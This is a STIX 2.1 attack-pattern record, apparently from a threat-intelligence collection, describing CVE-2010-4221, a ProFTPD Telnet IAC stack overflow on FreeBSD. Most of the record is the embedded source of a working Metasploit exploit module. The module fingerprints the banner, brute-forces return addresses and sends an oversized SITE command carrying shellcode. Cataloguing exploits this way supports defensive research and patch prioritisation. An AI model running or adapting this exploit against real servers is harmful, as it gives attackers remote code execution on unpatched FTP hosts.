{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d626c4c4-6294-4b14-8270-2162f272adb6",
    "created": "2024-08-14T16:33:36.95234Z",
    "modified": "2024-08-14T16:33:36.952344Z",
    "name": "ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (FreeBSD)",
    "description": " This module exploits a stack-based buffer overflow in versions of ProFTPD server between versions 1.3.2rc3 and 1.3.3b. By sending data containing a large number of Telnet IAC commands, an attacker can corrupt memory and execute arbitrary code. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/freebsd/ftp/proftp_telnet_iac.rb",
            "external_id": "proftp_telnet_iac.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-4221"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Ftp\n  include Msf::Exploit::Brute\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (FreeBSD)',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow in versions of ProFTPD\n        server between versions 1.3.2rc3 and 1.3.3b. By sending data containing a\n        large number of Telnet IAC commands, an attacker can corrupt memory and\n        execute arbitrary code.\n      },\n      'Author'         => [ 'jduck' ],\n      'References'     =>\n        [\n          ['CVE', '2010-4221'],\n          ['OSVDB', '68985'],\n          ['BID', '44562']\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'PrependChrootBreak' => true\n        },\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n          # NOTE: \\xff's need to be doubled (per ftp/telnet stuff)\n          'BadChars' => \"\\x00\\x0a\\x0d\",\n          'PrependEncoder' => \"\\x83\\xec\\x7f\", # sub esp,0x7f (fix esp)\n        },\n      'Platform'       => [ 'bsd' ],\n      'Targets'        =>\n      [\n        #\n        # Automatic targeting via fingerprinting\n        #\n        [ 'Automatic Targeting', { 'auto' => true }  ],\n\n        #\n        # This special one comes first since we dont want its index changing.\n        #\n        [\t'Debug',\n          {\n            'IACCount' => 8192, # should cause crash writing off end of stack\n            'Offset' => 0,\n            'Ret' => 0x41414242,\n            'Writable' => 0x43434545\n          }\n        ],\n\n        #\n        # specific targets\n        #\n        [ 'ProFTPD 1.3.2a Server (FreeBSD 8.0)',\n          {\n            'IACCount' => 1024,\n            'Offset' => 0x414,\n            #'Ret' => 0xbfbfeac4,\n            'Writable' => 0x80e64a4,\n            'Bruteforce'   =>\n              {\n                'Start' => { 'Ret' => 0xbfbffdfc },\n                'Stop'  => { 'Ret' => 0xbfa00000 },\n                'Step'  => 512\n              }\n          }\n        ],\n\n      ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2010-11-01'))\n\n    register_options(\n      [\n        Opt::RPORT(21),\n      ])\n  end\n\n\n  def check\n    # NOTE: We don't care if the login failed here...\n    ret = connect\n    banner = sock.get_once || ''\n\n    # We just want the banner to check against our targets..\n    vprint_status(\"FTP Banner: #{banner.strip}\")\n\n    status = CheckCode::Safe\n    if banner =~ /ProFTPD (1\\.3\\.[23])/i\n      banner_array = banner.split('.')\n\n      if banner_array.count() > 0 && !banner_array[3].nil?\n        # gets 1 char on the third part of version number.\n        relnum = banner_array[2][0..0]\n        tmp = banner_array[2].split(' ')\n        # gets extra string info of version number.\n        # example: 1.2.3rc ('rc' string)\n        extra = tmp[0][1..(tmp[0].length - 1)]\n        if relnum == '2'\n          if extra.length > 0\n            if extra[0..1] == 'rc'\n              v = extra[2..extra.length].to_i\n              if v && v > 2\n                status = CheckCode::Appears\n              end\n            else\n              status = CheckCode::Appears\n            end\n          end\n        elsif relnum == '3'\n          if [ '', 'a', 'b', ].include?(extra)\n            status = CheckCode::Appears\n          end\n        end\n      end\n    end\n\n    disconnect\n    return status\n  end\n\n  def target\n    return @mytarget if @mytarget\n    super\n  end\n\n  def exploit\n    connect\n\n    # Use a copy of the target\n    @mytarget = target\n\n    if (target['auto'])\n      @mytarget = nil\n\n      print_status(\"Automatically detecting the target...\")\n      if (banner and (m = banner.match(/ProFTPD (1\\.3\\.[23][^ ]) Server/i))) then\n        print_status(\"FTP Banner: #{banner.strip}\")\n        version = m[1]\n      else\n        fail_with(Failure::NoTarget, \"No matching target\")\n      end\n\n      regexp = Regexp.escape(version)\n      self.targets.each do |t|\n        if (t.name =~ /#{regexp}/) then\n          @mytarget = t\n          break\n        end\n      end\n\n      if (not @mytarget)\n        fail_with(Failure::NoTarget, \"No matching target\")\n      end\n\n      print_status(\"Selected Target: #{@mytarget.name}\")\n\n      pl = exploit_regenerate_payload(@mytarget.platform, arch)\n      if not pl\n        fail_with(Failure::Unknown, 'Unable to regenerate payload!')\n      end\n    else\n      print_status(\"Trying target #{@mytarget.name}...\")\n      if banner\n        print_status(\"FTP Banner: #{banner.strip}\")\n      end\n\n      pl = payload\n    end\n    disconnect\n\n    super\n  end\n\n  def brute_exploit(addrs)\n    @mytarget ||= target\n\n    ret = addrs['Ret']\n    print_status(\"Trying return address 0x%.8x...\" % ret)\n\n    #puts \"attach and press any key\"; bleh = $stdin.gets\n\n    buf = ''\n    buf << 'SITE '\n    # NOTE: buf must be odd-lengthed prior to here.\n    buf << \"\\xff\" * @mytarget['IACCount']\n    buf << rand_text_alphanumeric(@mytarget['Offset'] - buf.length)\n    buf << [\n      ret,\n      @mytarget['Writable']\n    ].pack('V*')\n    buf << payload.encoded\n    buf << \"\\r\\n\"\n\n    connect\n    sock.put(buf)\n    disconnect\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-11-01",
    "x_mitre_platforms": [
        "[ 'bsd' ]"
    ]
}